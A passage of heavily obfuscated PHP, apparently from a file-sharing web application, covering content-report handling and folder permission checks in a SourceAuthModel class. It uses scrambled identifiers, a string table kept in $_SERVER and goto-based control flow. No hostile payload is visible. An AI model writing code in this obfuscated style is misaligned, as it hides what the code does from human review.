($dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[702]]) { $c†ÉÉÔãô™ = $dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[703]] ? $dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[703]] : strtotime(date($bÈÂÀ×Ö¢[2211])); $b„ÛÔà‚Ğç[$bÈÂÀ×Ö¢[184]] = array($bÈÂÀ×Ö¢[318], array($dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[702]], $c†ÉÉÔãô™)); } if ($dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[29]]) { $b„ÛÔà‚Ğç[$dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[29]]] = 1; } else { $b„ÛÔà‚Ğç[] = array($bÈÂÀ×Ö¢[442] => array($bÈÂÀ×Ö¢[924], 0), $bÈÂÀ×Ö¢[444] => array($bÈÂÀ×Ö¢[924], 0), $bÈÂÀ×Ö¢[2186] => $bÈÂÀ×Ö¢[2155]); } if ($dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[2151]]) { $b„ÛÔà‚Ğç[] = array($bÈÂÀ×Ö¢[439] => $dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[2151]], $bÈÂÀ×Ö¢[1317] => array($bÈÂÀ×Ö¢[751], "\x25{$dˆÁŞ°†äÑ[$bÈÂÀ×Ö¢[2151]]}\x25"), $bÈÂÀ×Ö¢[2186] => $bÈÂÀ×Ö¢[2155]); } goto E¤œÁã„ÍÀ; BÒ®¦ì»: } public function listDataApply($F‘·†Ì¹) { $this->_listDataApply($F‘·†Ì¹); return $F‘·†Ì¹; } private function _listDataApply(&$Fëİäˆ¥èŸ) { $C‡ªĞ¸†Ö´ =& $_SERVER[¢à]; $AòÎ«…”“ñ = array_to_keyvalue($Fëİäˆ¥èŸ, $C‡ªĞ¸†Ö´[33], $C‡ªĞ¸†Ö´[1412]); $Fåšò†Á·« = Model($C‡ªĞ¸†Ö´[473])->userListInfo(array_unique($AòÎ«…”“ñ)); $F¨µî¨È¢ß = array_to_keyvalue($Fëİäˆ¥èŸ, $C‡ªĞ¸†Ö´[33], $C‡ªĞ¸†Ö´[366]); $dõ’çÀÌÆô = Model($C‡ªĞ¸†Ö´[752])->sourceListInfo($F¨µî¨È¢ß, !0); foreach ($Fëİäˆ¥èŸ as &$bğ‹š©àÔŒ) { $cä¸§É«ÎŒ = $bğ‹š©àÔŒ[$C‡ªĞ¸†Ö´[1412]]; $bğ‹š©àÔŒ[$C‡ªĞ¸†Ö´[2212]] = $Fåšò†Á·«[$cä¸§É«ÎŒ] ? $Fåšò†Á·«[$cä¸§É«ÎŒ] : !1; $a“È¹Üî»Ô = $bğ‹š©àÔŒ[$C‡ªĞ¸†Ö´[366]]; $bğ‹š©àÔŒ[$C‡ªĞ¸†Ö´[388]] = $dõ’çÀÌÆô[$a“È¹Üî»Ô] ? $dõ’çÀÌÆô[$a“È¹Üî»Ô] : !1; } } private function _makeOrder($dñéµÔÒ = '') { goto a“ÃØ§ó¯‹; BÉ»¥’Æä: $dñéµÔÒ = $dñéµÔÒ . "{$B®Ç«æ¾ôØ}\40{$bß¸ñŞÙç}"; return $this->order($dñéµÔÒ); goto dÔµôåÜ§ë; fœô²‹‡Ê: $B®Ç«æ¾ôØ = Input::get($F¯¨œ‡‡Á’[403], $F¯¨œ‡‡Á’[7], $F¯¨œ‡‡Á’[386], $DçéŒ˜®Œ); $bß¸ñŞÙç = Input::get($F¯¨œ‡‡Á’[404], $F¯¨œ‡‡Á’[7], $F¯¨œ‡‡Á’[2213], array($F¯¨œ‡‡Á’[2150], $F¯¨œ‡‡Á’[400])); $bß¸ñŞÙç = $f›îÎË«óÅ[$bß¸ñŞÙç]; goto BÉ»¥’Æä; a“ÃØ§ó¯‹: $F¯¨œ‡‡Á’ =& $_SERVER[¢à]; $DçéŒ˜®Œ = array($F¯¨œ‡‡Á’[184], $F¯¨œ‡‡Á’[703], $F¯¨œ‡‡Á’[2198], $F¯¨œ‡‡Á’[2199]); $f›îÎË«óÅ = array($F¯¨œ‡‡Á’[398] => $F¯¨œ‡‡Á’[399], $F¯¨œ‡‡Á’[400] => $F¯¨œ‡‡Á’[401]); goto fœô²‹‡Ê; dÔµôåÜ§ë: } public function reportAdd($Fëì‰Áœ‡) { $ešó¼Ä×Üå =& $_SERVER[¢à]; $Bóî”Áçİ = array($ešó¼Ä×Üå[437] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[437]], $ešó¼Ä×Üå[1412] => USER_ID); if (Model($ešó¼Ä×Üå[2209])->where($Bóî”Áçİ)->find()) { return !1; } $CëÍÂä­Á = array($ešó¼Ä×Üå[437] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[437]], $ešó¼Ä×Üå[1317] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[1317]], $ešó¼Ä×Üå[366] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[366]], $ešó¼Ä×Üå[415] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[415]], $ešó¼Ä×Üå[1412] => USER_ID, $ešó¼Ä×Üå[29] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[29]], $ešó¼Ä×Üå[401] => $Fëì‰Áœ‡[$ešó¼Ä×Üå[401]]); return Model($ešó¼Ä×Üå[2209])->add($CëÍÂä­Á); } public function reportList($Eßˆ„Ù‚Óª) { goto E×§³ô‡; E×§³ô‡: $b·ß•¡ÛŸ„ =& $_SERVER[¢à]; $dµ³ãÎ¬´ = array(); if ($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[702]]) { $BáŸò„Ñ¢ø = $Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[703]] ? $Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[703]] : strtotime(date($b·ß•¡ÛŸ„[2211])); $dµ³ãÎ¬´[$b·ß•¡ÛŸ„[184]] = array($b·ß•¡ÛŸ„[318], array($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[702]], $BáŸò„Ñ¢ø)); } goto Dòª³ò©Ã; C°ø‚«‡´—: if (empty($b¨ÎŞ“µ[$b·ß•¡ÛŸ„[351]])) { return array(); } $this->_listDataApply($b¨ÎŞ“µ[$b·ß•¡ÛŸ„[351]]); return $b¨ÎŞ“µ; goto d„í‡†ÓˆĞ; Dòª³ò©Ã: if (isset($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[29]]) && in_array($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[29]], array($b·ß•¡ÛŸ„[83], $b·ß•¡ÛŸ„[2214], $b·ß•¡ÛŸ„[2215], $b·ß•¡ÛŸ„[2216], $b·ß•¡ÛŸ„[1891]))) { $dµ³ãÎ¬´[$b·ß•¡ÛŸ„[29]] = $Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[29]]; } if (isset($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[689]]) && in_array($Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[689]], array($b·ß•¡ÛŸ„[464], $b·ß•¡ÛŸ„[83], $b·ß•¡ÛŸ„[2214], $b·ß•¡ÛŸ„[2215]))) { $dµ³ãÎ¬´[$b·ß•¡ÛŸ„[689]] = $Eßˆ„Ù‚Óª[$b·ß•¡ÛŸ„[689]]; } $cÎëè—³„­ = Input::get($b·ß•¡ÛŸ„[404], $b·ß•¡ÛŸ„[7], $b·ß•¡ÛŸ„[2213], array($b·ß•¡ÛŸ„[2150], $b·ß•¡ÛŸ„[400])); goto A£‡Ò¹Ì–; A£‡Ò¹Ì–: $eº†î­ƒ® = array($b·ß•¡ÛŸ„[398] => $b·ß•¡ÛŸ„[399], $b·ß•¡ÛŸ„[400] => $b·ß•¡ÛŸ„[401]); $bøµÛÓÛ–Í = $b·ß•¡ÛŸ„[2217] . $eº†î­ƒ®[$cÎëè—³„­]; $b¨ÎŞ“µ = Model($b·ß•¡ÛŸ„[2209])->where($dµ³ãÎ¬´)->order($bøµÛÓÛ–Í)->selectPage(20); goto C°ø‚«‡´—; d„í‡†ÓˆĞ: } public function reportStatus($d÷ªñŠÔÇ) { goto EÊìãÍµŒ; EÊìãÍµŒ: $aš¸ß¬Î¨ =& $_SERVER[¢à]; $e¤É†‘Ê¶Õ = array($aš¸ß¬Î¨[364] => $d÷ªñŠÔÇ[$aš¸ß¬Î¨[364]]); $eÚË«†ìöë = Model($aš¸ß¬Î¨[2209])->where($e¤É†‘Ê¶Õ)->field($aš¸ß¬Î¨[2218])->find(); goto E£¤õ˜½ÌÚ; Dñ“ÆêÃ: $B­ç½š…¬ = Model($aš¸ß¬Î¨[2209])->where($e¤É†‘Ê¶Õ)->save($CÀÓß°…Ğ); if ($d÷ªñŠÔÇ[$aš¸ß¬Î¨[689]] == $aš¸ß¬Î¨[2214]) { if ($eÚË«†ìöë[$aš¸ß¬Î¨[415]] != $aš¸ß¬Î¨[464] && $this->shareFileMeta($eÚË«†ìöë[$aš¸ß¬Î¨[415]])) { $this->shareFileMeta($eÚË«†ìöë[$aš¸ß¬Î¨[415]], 0); } return $this->remove($eÚË«†ìöë[$aš¸ß¬Î¨[437]]); } if ($B­ç½š…¬ && $d÷ªñŠÔÇ[$aš¸ß¬Î¨[689]] == $aš¸ß¬Î¨[2215]) { $D¢ƒÏæ—ªõ = $CÀÓß°…Ğ[$aš¸ß¬Î¨[689]] == $aš¸ß¬Î¨[2215] ? 1 : 0; $this->shareFileMeta($eÚË«†ìöë[$aš¸ß¬Î¨[415]], $D¢ƒÏæ—ªõ); $this->removeByFile($eÚË«†ìöë[$aš¸ß¬Î¨[415]]); } goto bŸßĞ¢’œ; bŸßĞ¢’œ: return $B­ç½š…¬; goto Bß—› æ„; E£¤õ˜½ÌÚ: if (!$eÚË«†ìöë) { return !1; } $CÀÓß°…Ğ = array($aš¸ß¬Î¨[689] => $d÷ªñŠÔÇ[$aš¸ß¬Î¨[689]]); if ($d÷ªñŠÔÇ[$aš¸ß¬Î¨[689]] == $aš¸ß¬Î¨[2215] && $eÚË«†ìöë[$aš¸ß¬Î¨[689]] == $aš¸ß¬Î¨[2215]) { $CÀÓß°…Ğ[$aš¸ß¬Î¨[689]] = 0; } goto Dñ“ÆêÃ; Bß—› æ„: } private function removeByFile($A‹ãÃºêƒ) { goto dò—Ø¢ä©·; dò—Ø¢ä©·: $Dµù“ä¯ =& $_SERVER[¢à]; $EªºØˆÎ = Model($Dµù“ä¯[752])->where(array($Dµù“ä¯[415] => $A‹ãÃºêƒ))->field($Dµù“ä¯[366])->select(); $eİ§•óÔ™‡ = array_to_keyvalue($EªºØˆÎ, $Dµù“ä¯[33], $Dµù“ä¯[366]); goto Aºãçèé¿ì; FÇ†è±êƒà: $this->remove($FŸà°‘‚·); goto bÈ’™¯ÈÁí; Aºãçèé¿ì: $DëÄÎÍÈ = array($Dµù“ä¯[366] => array($Dµù“ä¯[7], $eİ§•óÔ™‡), $Dµù“ä¯[442] => 1); $EªºØˆÎ = Model($Dµù“ä¯[2052])->where($DëÄÎÍÈ)->field($Dµù“ä¯[437])->select(); $FŸà°‘‚· = array_to_keyvalue($EªºØˆÎ, $Dµù“ä¯[33], $Dµù“ä¯[437]); goto FÇ†è±êƒà; bÈ’™¯ÈÁí: } private function shareFileMeta($DÓÛ°£¬éÂ, $böŸÆ‡ëãº = null) { $bï¦ÁÓ¹âõ =& $_SERVER[¢à]; $EË¸ó¦ëâ£ = array($bï¦ÁÓ¹âõ[415] => $DÓÛ°£¬éÂ, $bï¦ÁÓ¹âõ[89] => $bï¦ÁÓ¹âõ[2219]); if (is_null($böŸÆ‡ëãº)) { return Model($bï¦ÁÓ¹âõ[2220])->where($EË¸ó¦ëâ£)->find(); } $EË¸ó¦ëâ£[$bï¦ÁÓ¹âõ[356]] = $böŸÆ‡ëãº; Model($bï¦ÁÓ¹âõ[2220])->add($EË¸ó¦ëâ£, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\143\145\x5f\141\x75\164\x68"; public function getAuth($a¡Ÿ·‘¥ñ) { goto C­ŒøÕº£ª; C­ŒøÕº£ª: $b¤‚·ìÜ =& $_SERVER[¢à]; $E‚ª†ìéÅå = $b¤‚·ìÜ[2221]; $AŸÂÜ¿å· = array($b¤‚·ìÜ[366] => $a¡Ÿ·‘¥ñ); goto Fµœ‘¥Í¥È; fºÂ„À•ÕÛ: return $F®ê¢ÂæğÔ; goto EÑÈÈ®Ã¬›; Fµœ‘¥Í¥È: $FğŒñò±İ° = $this->field($E‚ª†ìéÅå)->order($b¤‚·ìÜ[364])->where($AŸÂÜ¿å·)->select(); $F®ê¢ÂæğÔ = array(); foreach ($FğŒñò±İ° as $C¨ªøã˜ß) { if (Model($b¤‚·ìÜ[2222])->listData($C¨ªøã˜ß[$b¤‚·ìÜ[2203]])) { $F®ê¢ÂæğÔ[] = $C¨ªøã˜ß; } } goto fºÂ„À•ÕÛ; EÑÈÈ®Ã¬›: } public function setAuth($D»ÉØàğ«š, $aò®´¿òÁ—) { goto CÄ¥ô²†; CÄ¥ô²†: $cÇì„ŒêÁİ =& $_SERVER[¢à]; $DË†È‹Üîš = Model($cÇì„ŒêÁİ[1106])->sourceInfo($D»ÉØàğ«š); if ($DË†È‹Üîš[$cÇì„ŒêÁİ[368]] != SourceModel::TYPE_GROUP) { return !1; } goto D‚ÆÚÃ‚ÇÖ; f£«´ê°½£: $this->where(array($cÇì„ŒêÁİ[380] => $D»ÉØàğ«š))->delete(); $this->addAll($e—Ö×¿ ƒ); return !0; goto c¸†ëå‰½«; c‹È¶ïËÂ: $F…İÇ°¹• = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e—Ö×¿ ƒ = array(); foreach ($aò®´¿òÁ— as $f§½î¿‡ó) { if (!in_array($f§½î¿‡ó[$cÇì„ŒêÁİ[368]], $F…İÇ°¹•)) { show_json(LNG($cÇì„ŒêÁİ[2223]), !1); } if ($DìäĞµ¬º‘ != $F¡ˆÖ¢ˆ) { if ($f§½î¿‡ó[$cÇì„ŒêÁİ[368]] == SourceModel::TYPE_GROUP) { } if ($f§½î¿‡ó[$cÇì„ŒêÁİ[452]] != 0 && !in_array($f§½î¿‡ó[$cÇì„ŒêÁİ[452]], $A—ÉĞçÄÒ›)) { } } if ($f§½î¿‡ó[$cÇì„ŒêÁİ[452]] == 0) { $f§½î¿‡ó[$cÇì„ŒêÁİ[368]] = SourceModel::TYPE_USER; } $e—Ö×¿ ƒ[] = array($cÇì„ŒêÁİ[366] => $D»ÉØàğ«š, $cÇì„ŒêÁİ[368] => intval($f§½î¿‡ó[$cÇì„ŒêÁİ[368]]), $cÇì„ŒêÁİ[452] => intval($f§½î¿‡ó[$cÇì„ŒêÁİ[452]]), $cÇì„ŒêÁİ[2203] => intval($f§½î¿‡ó[$cÇì„ŒêÁİ[2203]]) ? intval($f§½î¿‡ó[$cÇì„ŒêÁİ[2203]]) : 0, $cÇì„ŒêÁİ[2204] => intval($f§½î¿‡ó[$cÇì„ŒêÁİ[2204]]) ? intval($f§½î¿‡ó[$cÇì„ŒêÁİ[2204]]) : -1); } goto f£«´ê°½£; D‚ÆÚÃ‚ÇÖ: $F¡ˆÖ¢ˆ = 1; $DìäĞµ¬º‘ = $DË†È‹Üîš[$cÇì„ŒêÁİ[452]]; if ($DìäĞµ¬º‘ != $F¡ˆÖ¢ˆ) { $d˜„Ö¡ ° = array($cÇì„ŒêÁİ[2075] => $DìäĞµ¬º‘); $A—ÉĞçÄÒ› = Model($cÇì„ŒêÁİ[2149])->field($cÇì„ŒêÁİ[1412])->where($d˜„Ö¡ °)->select(); $A—ÉĞçÄÒ› = array_to_keyvalue($A—ÉĞçÄÒ›, $cÇì„ŒêÁİ[33], $cÇì„ŒêÁİ[1412]); } goto c‹È¶ïËÂ; c¸†ëå‰½«: } public function authClear($A§äªä¦”) { $A÷œÂ¿ƒ× =& $_SERVER[¢à]; $eõœŞ³‹Œ = Model($A÷œÂ¿ƒ×[1106])->sourceInfo($A§äªä¦”); $bº¯˜åˆø´ = array($A§äªä¦”); if ($eõœŞ³‹Œ[$A÷œÂ¿ƒ×[367]] == $A÷œÂ¿ƒ×[83]) { $d®”œœ‘Æ = array($A÷œÂ¿ƒ×[521] => array($A÷œÂ¿ƒ×[479], $eõœŞ³‹Œ[$A÷œÂ¿ƒ×[455]] . $A§äªä¦” . $A÷œÂ¿ƒ×[480])); $bº¯˜åˆø´ = Model($A÷œÂ¿ƒ×[1106])->field($A÷œÂ¿ƒ×[380])->where($d®”œœ‘Æ)->getField($A÷œÂ¿ƒ×[366], !0); $bº¯˜åˆø´[] = $A§äªä¦”; } $this->where(array($A÷œÂ¿ƒ×[380] => array($A÷œÂ¿ƒ×[381], $bº¯˜åˆø´)))->delete(); return !0; } public function get($fŸ£ä÷ôç¹) { $A‰Šëñö±Ñ = $this->getSourceList(array($fŸ£ä÷ôç¹), !0); return $A‰Šëñö±Ñ[0]; } public function getSourceList($d•ù¯˜àá , $eä†³ŠçÕ = false) { goto A¹§„›„Á; a‹ãáöí: $FõåÎîó¡Ñ = array_values(array_unique($FõåÎîó¡Ñ)); if (!$FõåÎîó¡Ñ) { return array(); } $fÖ§å¸øº± = $b‡»¢¡Î™‚[2225]; goto e¨Œî…­ñä; f‰ÚÍ¤¶ğÏ: $b™”ÂµÜÁö = array(); foreach ($eä†³ŠçÕ as $fÕ•×‚Ç => $bìĞ¸’øë) { $b™”ÂµÜÁö[$fÕ•×‚Ç] = $this->makeSourceAuth($bìĞ¸’øë, $FÛÍñ‡ÕØ‰); } return $b™”ÂµÜÁö; goto fø†¹öÏñ; e¨Œî…­ñä: $bËˆĞ‹Š®ç = array($b‡»¢¡Î™‚[380] => array($b‡»¢¡Î™‚[381], $FõåÎîó¡Ñ)); $FÛÍñ‡ÕØ‰ = $this->field($fÖ§å¸øº±)->where($bËˆĞ‹Š®ç)->select(); $FÛÍñ‡ÕØ‰ = array_to_keyvalue_group($FÛÍñ‡ÕØ‰, $b‡»¢¡Î™‚[366]); goto f‰ÚÍ¤¶ğÏ; d‰ÙëÛ¨š: if (!$eä†³ŠçÕ) { $bËˆĞ‹Š®ç = array($b‡»¢¡Î™‚[380] => array($b‡»¢¡Î™‚[381], $d•ù¯˜àá )); $eä†³ŠçÕ = $EÄ¯”±ÉÍæ->field($b‡»¢¡Î™‚[2224])->where($bËˆĞ‹Š®ç)->select(); $eä†³ŠçÕ = array_to_keyvalue($eä†³ŠçÕ, $b‡»¢¡Î™‚[366]); } $FõåÎîó¡Ñ = $d•ù¯˜àá ; foreach ($eä†³ŠçÕ as $cƒˆ‹‘İª¿ => $BÃ¯ÃÊù‚‡) { $Fò–ƒĞÛÔŠ = $EÄ¯”±ÉÍæ->parentLevelArray($BÃ¯ÃÊù‚‡[$b‡»¢¡Î™‚[455]]); $FõåÎîó¡Ñ = array_merge($FõåÎîó¡Ñ, $Fò–ƒĞÛÔŠ, array($cƒˆ‹‘İª¿)); } goto a‹ãáöí; A¹§„›„Á: $b‡»¢¡Î™‚ =& $_SERVER[¢à]; if (!$d•ù¯˜àá ) { return array(); } $EÄ¯”±ÉÍæ = Model($b‡»¢¡Î™‚[1106]); goto d‰ÙëÛ¨š; fø†¹öÏñ: } public function authDeepCheck($EˆÅŒ©Æ˜, $F”¬ŸË‡ò½ = false) { $aƒ«Û°ÃÊ» =& $_SERVER[¢à]; if (_get($GLOBALS, $aƒ«Û°ÃÊ»[453])) { return !1; } $bÔ÷‘°†µğ = $this->makeAuthDeep(); if (!in_array($EˆÅŒ©Æ˜, $bÔ÷‘°†µğ)) { return !1; } return array($aƒ«Û°ÃÊ»[374] => -1, $aƒ«Û°ÃÊ»[414] => array($aƒ«Û°ÃÊ»[382] => $aƒ«Û°ÃÊ»[1027], $aƒ«Û°ÃÊ»[2081] => $aƒ«Û°ÃÊ»[464], $aƒ«Û°ÃÊ»[383] => LNG($aƒ«Û°ÃÊ»[2226]), $aƒ«Û°ÃÊ»[2093] => $aƒ«Û°ÃÊ»[2227])); } protected function makeAuthDeep() { goto Fò¯ßÒ›Ï; f´À÷ê–: $bœ«¦¬è« = array_values(array_unique($bœ«¦¬è«)); $d½Ó¾Ñ®Ğ‚ = $bœ«¦¬è«; foreach ($d½Ó¾Ñ®Ğ‚ as $fß˜‰Šëª¼) { $bÁ î±Úäî = $A²æËë¯öß->getInfo($fß˜‰Šëª¼); $CÒõ³ÚÑ‘ = $cõáçÆğã¶->parentLevelArray($bÁ î±Úäî[$B‚éô¡ƒëê[455]]); $bœ«¦¬è« = array_merge($bœ«¦¬è«, $CÒõ³ÚÑ‘); } goto e»İùõ‹‡·; e»İùõ‹‡·: $bœ«¦¬è« = array_values(array_unique($bœ«¦¬è«)); foreach ($bœ«¦¬è« as $fß˜‰Šëª¼) { $bÁ î±Úäî = $A²æËë¯öß->getInfo($fß˜‰Šëª¼); $fŠêŞ¬†®¯[] = $bÁ î±Úäî[$B‚éô¡ƒëê[388]][$B‚éô¡ƒëê[366]]; } $fŠêŞ¬†®¯ = array_values(array_unique($fŠêŞ¬†®¯)); goto a¼›Ä×ùÃ–; aÒÏÒÛ¬ì: if ($A—ÄÇğÕ¡İ) { $eóÎ»›¬õè = array(array($B‚éô¡ƒëê[368] => SourceModel::TYPE_USER, $B‚éô¡ƒëê[452] => USER_ID), array($B‚éô¡ƒëê[368] => SourceModel::TYPE_GROUP, $B‚éô¡ƒëê[452] => array($B‚éô¡ƒëê[381], $A—ÄÇğÕ¡İ)), $B‚éô¡ƒëê[912] => $B‚éô¡ƒëê[2155]); } if ($bÛ–Ğ¾ÚÀ…) { $eóÎ»›¬õè = array($eóÎ»›¬õè, $B‚éô¡ƒëê[2203] => array($B‚éô¡ƒëê[2229], $bÛ–Ğ¾ÚÀ…)); } $A¤¤Ğø‘Ê = $this->field($B‚éô¡ƒëê[2230])->where($eóÎ»›¬õè)->select(); goto bŒ«ƒ·¤Ù; Còë°šŒ¼Œ: $A—ÄÇğÕ¡İ = Session::get($B‚éô¡ƒëê[2187]); $A—ÄÇğÕ¡İ = array_to_keyvalue($A—ÄÇğÕ¡İ, $B‚éô¡ƒëê[33], $B‚éô¡ƒëê[2075]); $eóÎ»›¬õè = array($B‚éô¡ƒëê[368] => SourceModel::TYPE_USER, $B‚éô¡ƒëê[452] => USER_ID); goto aÒÏÒÛ¬ì; a¼›Ä×ùÃ–: return $fŠêŞ¬†®¯; goto D„’•áà‰; Fò¯ßÒ›Ï: $B‚éô¡ƒëê =& $_SERVER[¢à]; static $fŠêŞ¬†®¯ = false; if ($fŠêŞ¬†®¯) { return $fŠêŞ¬†®¯; } goto fö¯§Ş; fö¯§Ş: $b³‡íÕø‰¨ = Model($B‚éô¡ƒëê[2228])->listData(); $bÛ–Ğ¾ÚÀ… = array(); foreach ($b³‡íÕø‰¨ as $e®•º‹ÁñŒ) { if ($e®•º‹ÁñŒ[$B‚éô¡ƒëê[373]] == 0 && $e®•º‹ÁñŒ[$B‚éô¡ƒëê[2095]] == $B‚éô¡ƒëê[83]) { $bÛ–Ğ¾ÚÀ…[] = $e®•º‹ÁñŒ[$B‚éô¡ƒëê[364]]; } } goto Còë°šŒ¼Œ; bŒ«ƒ·¤Ù: $CĞº­ÜäàÜ = array_to_keyvalue($A¤¤Ğø‘Ê, $B‚éô¡ƒëê[33], $B‚éô¡ƒëê[366]); $fŠêŞ¬†®¯ = array(); $bœ«¦¬è« = $A—ÄÇğÕ¡İ; goto bËÙ¨–ï¾; bËÙ¨–ï¾: $cõáçÆğã¶ = Model($B‚éô¡ƒëê[1106]); $A²æËë¯öß = Model($B‚éô¡ƒëê[454]); if ($CĞº­ÜäàÜ) { $eÙ¥‡åÚŒ“ = $cõáçÆğã¶->where(array($B‚éô¡ƒëê[366] => array($B‚éô¡ƒëê[381], $CĞº­ÜäàÜ)))->select(); foreach ($eÙ¥‡åÚŒ“ as $eëº¥³ìË®) { $CÒõ³ÚÑ‘ = $cõáçÆğã¶->parentLevelArray($eëº¥³ìË®[$B‚éô¡ƒëê[455]]); $fŠêŞ¬†®¯ = array_merge($fŠêŞ¬†®¯, $CÒõ³ÚÑ‘); $bœ«¦¬è«[] = $eëº¥³ìË®[$B‚éô¡ƒëê[452]]; } } goto f´À÷ê–; D„’•áà‰: } private function makeSourceAuth($fƒ°¨„¸ô, $a§³æË¬¾) { goto A½‰¦çš§; DëÛ–˜Ä„è: $AùÑ„Ä¯àÅ = array_merge(array($fƒ°¨„¸ô[$BØÕÊ²¬ï [366]]), array_reverse($AùÑ„Ä¯àÅ)); $c‹¬¢Şï = !1; foreach ($AùÑ„Ä¯àÅ as $eÎ…‚Û ”) { if (!isset($a§³æË¬¾[$eÎ…‚Û ”])) { continue; } $D©ã—è”ˆä = $this->authMake($a§³æË¬¾[$eÎ…‚Û ”]); if ($D©ã—è”ˆä[$BØÕÊ²¬ï [414]]) { $c‹¬¢Şï = $D©ã—è”ˆä; break; } } goto F†Æ‘»ñô; F†Æ‘»ñô: if (!$c‹¬¢Şï) { $C¸µİ”´Ï = array_to_keyvalue($C¸µİ”´Ï, $BØÕÊ²¬ï [2075]); $eƒ¯µå¸Ì¿ = $fƒ°¨„¸ô[$BØÕÊ²¬ï [452]]; $dÚÕ ¯½šğ = isset($C¸µİ”´Ï[$eƒ¯µå¸Ì¿]) ? $C¸µİ”´Ï[$eƒ¯µå¸Ì¿] : !1; if ($dÚÕ ¯½šğ) { $c‹¬¢Şï = array($BØÕÊ²¬ï [2231] => intval($dÚÕ ¯½šğ[$BØÕÊ²¬ï [373]][$BØÕÊ²¬ï [373]]), $BØÕÊ²¬ï [2232] => $dÚÕ ¯½šğ[$BØÕÊ²¬ï [373]]); } } if ((!$c‹¬¢Şï || $c‹¬¢Şï[$BØÕÊ²¬ï [374]] <= 0) && $fƒ°¨„¸ô[$BØÕÊ²¬ï [368]] == SourceModel::TYPE_GROUP) { $d·ÎğÌ¶… = $this->authDeepCheck($fƒ°¨„¸ô[$BØÕÊ²¬ï [366]], $c‹¬¢Şï); if ($d·ÎğÌ¶…) { $c‹¬¢Şï = $d·ÎğÌ¶…; } } return $c‹¬¢Şï; goto fƒŸÕà½‡“; A½‰¦çš§: $BØÕÊ²¬ï  =& $_SERVER[¢à]; $C¸µİ”´Ï = Session::get($BØÕÊ²¬ï [2187]); $AùÑ„Ä¯àÅ = Model($BØÕÊ²¬ï [1106])->parentLevelArray($fƒ°¨„¸ô[$BØÕÊ²¬ï [455]]); goto DëÛ–˜Ä„è; fƒŸÕà½‡“: } public function authOwnerApply($C¶†Öé—¹‡) { goto E©î¦Œéš; A´½ÖÛ§¨: $CÁ†éîÇ¢ = array(); $cğœ ¥ğÓÌ = array(); foreach ($Cø¦…é°é as $CÏå÷—§– => $d¶“š©ğÍ) { $f«‡éÉÁ†Ä = $this->authFolderOwnerUser($d¶“š©ğÍ); $CÁ†éîÇ¢[$CÏå÷—§–] = $f«‡éÉÁ†Ä; $cğœ ¥ğÓÌ = array_merge($cğœ ¥ğÓÌ, $f«‡éÉÁ†Ä[$E¯«ÈŒÅĞ‹[531]]); if ($f«‡éÉÁ†Ä[$E¯«ÈŒÅĞ‹[2234]]) { break; } } goto DĞ‡¿…‡«; B¸æ™¸ĞÂƒ: $dñ…îğÏ¨› = array($E¯«ÈŒÅĞ‹[380] => array($E¯«ÈŒÅĞ‹[381], $Eèö„×ğ½)); $Cø¦…é°é = $this->field($C¦êå¬˜®)->where($dñ…îğÏ¨›)->select(); $Cø¦…é°é = array_to_keyvalue_group($Cø¦…é°é, $E¯«ÈŒÅĞ‹[366]); goto A´½ÖÛ§¨; Bğº¹¤Ö“ø: $Eèö„×ğ½ = Model($E¯«ÈŒÅĞ‹[1106])->parentLevelArray($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[455]]); $Eèö„×ğ½ = array_merge(array($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[366]]), array_reverse($Eèö„×ğ½)); $C¦êå¬˜® = $E¯«ÈŒÅĞ‹[2225]; goto B¸æ™¸ĞÂƒ; E©î¦Œéš: $E¯«ÈŒÅĞ‹ =& $_SERVER[¢à]; if (empty($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[373]]) || isset($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[2233]]) && $C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[2233]]) { return $C¶†Öé—¹‡; } if (AuthModel::authCheckRoot($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[373]][$E¯«ÈŒÅĞ‹[374]])) { return $C¶†Öé—¹‡; } goto Bğº¹¤Ö“ø; dÑÒÂ¿´—: $C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[373]][$E¯«ÈŒÅĞ‹[2235]] = Model($E¯«ÈŒÅĞ‹[470])->userListInfo($cğœ ¥ğÓÌ); return $C¶†Öé—¹‡; goto FÁŒšÕÓº‘; DĞ‡¿…‡«: if (count($cğœ ¥ğÓÌ) == 0) { $cğœ ¥ğÓÌ = $this->authFolderOwnerGroup($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[452]]); } $cğœ ¥ğÓÌ = array_unique($cğœ ¥ğÓÌ); if (AuthModel::authCheckRoot($C¶†Öé—¹‡[$E¯«ÈŒÅĞ‹[373]][$E¯«ÈŒÅĞ‹[374]])) { $cğœ ¥ğÓÌ[] = USER_ID; } goto dÑÒÂ¿´—; FÁŒšÕÓº‘: } private function authFolderOwnerGroup($dÒ‘ŞÙ­ñê) { $Fˆ†˜È°ğ =& $_SERVER[¢à]; $cƒÜ¡³Àª = Model($Fˆ†˜È°ğ[2149])->where(array($Fˆ†˜È°ğ[2075] => 